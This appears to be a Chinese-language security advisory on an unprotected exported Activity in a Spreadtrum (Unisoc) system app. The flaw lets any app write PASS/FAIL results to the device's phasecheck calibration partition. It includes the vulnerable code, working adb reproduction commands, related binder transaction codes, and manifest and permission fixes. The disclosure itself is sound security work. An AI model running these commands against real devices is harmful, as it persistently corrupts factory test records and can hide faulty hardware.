# V06 — `AudioStationUpdateActivity` phasecheck 分区任意写入

| 项 | 值 |
|----|----|
| **严重性** | 🔴 严重 (High/Critical) |
| **CWE** | CWE-306 Missing Authentication for Critical Function |
| **受影响应用** | `com.sprd.validationtools` (MMITools.apk) |
| **UID** | **1000 (android.uid.system)** |
| **组件** | `com.sprd.validationtools.AudioStationUpdateActivity` |
| **exported** | `true` (`0xffffffff`) |
| **permission** | **无** |
| **实机验证** | ✅ 已确认 |

---

## 1. 摘要

`AudioStationUpdateActivity` 是一个完全导出、无任何权限保护的 Activity。它的
`onCreate()` 会无条件读取 Intent 中的 `msg` 字符串，并根据其值写入设备的
**phasecheck 分区**（工厂校准数据区）。任何第三方应用只需发送一个 Intent，
即可篡改该校验状态。

## 2. 漏洞代码

```java
// AudioStationUpdateActivity.java
public class AudioStationUpdateActivity extends Activity {

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);

        int stationIndex = Const.getStationIndex("AUDIO");
        if (stationIndex == -1) return;

        String stringExtra = getIntent().getStringExtra("msg");   // ← 外部可控
        if (stringExtra != null) {
            if ("AUDIO PASS".equals(stringExtra)) {
                this.stationResult = "0";
            } else if ("AUDIO FAIL".equals(stringExtra)) {
                this.stationResult = "1";
            } else {
                this.stationResult = "1";                          // ← 任意其他值也视为 FAIL
            }
            new SavePhasecheckAsyncTask().executeOnExecutor(
                AsyncTask.THREAD_POOL_EXECUTOR, "AUDIO", this.stationResult);
        }
        finish();
    }
}
```

底层写入实现：

```java
// PhaseCheckParse.java
public boolean writeStationPass(int i) {
    Parcel parcel = new Parcel();
    Parcel parcel2 = new Parcel();
    parcel.writeInt(i);
    this.binder.transact(3, parcel, parcel2, 0);   // TYPE_WRITE_STATION_PASS
    ...
}

public boolean writeStationFail(int i) {
    ...
    this.binder.transact(4, parcel, parcel2, 0);   // TYPE_WRITE_STATION_FAIL
}
```

`binder` 是一个通过本地 socket `phasecheck_srv` 通信的代理，最终由具有
分区写权限的 native 服务写入 phasecheck 分区。

## 3. 影响

phasecheck 分区保存出厂校准结果（音频、摄像头、传感器等）。篡改后：

- 工厂/售后检测流程会误判（把坏机当良品、良品当坏机）
- 部分机型的音频/射频校准数据与状态绑定，可能导致功能异常
- 属于**持久化篡改**，恢复出厂设置不一定会清除

## 4. 复现

```bash
# 标记 AUDIO station 为通过
adb shell am start -n \
  com.sprd.validationtools/com.sprd.validationtools.AudioStationUpdateActivity \
  -e msg "AUDIO PASS"

# 标记为失败
adb shell am start -n \
  com.sprd.validationtools/com.sprd.validationtools.AudioStationUpdateActivity \
  -e msg "AUDIO FAIL"
```

**验证**：打开 MMITools → 单项测试 → Audio，观察状态变化。

**回滚**：再执行一次 `AUDIO PASS` 即可覆盖为通过。

## 5. 同源风险

`PhaseCheckParse` 还暴露了下列 transact 类型，虽未找到直接外部入口，
但若被间接调用同样危险：

| 常量 | 值 | 含义 |
|------|-----|------|
| `TYPE_WRITE_STATION_TESTED` | 2 | 标记已测 |
| `TYPE_WRITE_STATION_PASS` | 3 | 标记通过 |
| `TYPE_WRITE_STATION_FAIL` | 4 | 标记失败 |
| `TYPE_WRITE_CHARGE_SWITCH` | 6 | 充电开关 |
| `TYPE_WRITE_OFFSET` | 17 | 写校准偏移 |
| `TYPE_EXECUTE_OFFSET_CALIBRATION` | 23 | 执行偏移校准 |
| `TYPE_EXECUTE_XTALK_CALIBRATION` | 24 | 执行串扰校准 |
| `TYPE_EXECUTE_AI_TEST` | 29 | 执行 AI 测试 |
| `TYPE_CHECK_KEYBOX` | 68 | 检查 Keybox |
| `TYPE_CHECK_WIDEVINEKEY` | 69 | 检查 Widevine Key |

## 6. 修复建议

```xml
<!-- AndroidManifest.xml -->
<activity android:name="com.sprd.validationtools.AudioStationUpdateActivity"
          android:exported="false" />
```

若业务确需外部调用（如产线 PC 工具），应：

1. 添加 `android:permission="<signature|privileged>"` 级别权限
2. 在 `onCreate` 中校验 `Binder.getCallingUid()`
3. 对 `msg` 做严格白名单校验
